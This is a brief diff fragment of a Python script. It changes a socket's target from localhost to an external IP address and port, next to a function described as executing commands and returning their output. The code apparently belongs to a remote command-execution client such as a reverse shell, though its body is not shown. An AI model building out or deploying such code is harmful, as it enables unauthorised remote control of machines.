@@ -10,7 +10,7 @@ import time
 
 
 socket = socket.socket()
-serverAddress = 'localhost', 1111
+serverAddress = '145.109.173.68', 1111
 
 #   --> Execute a command and return the result of it
 def popenExecution(data):
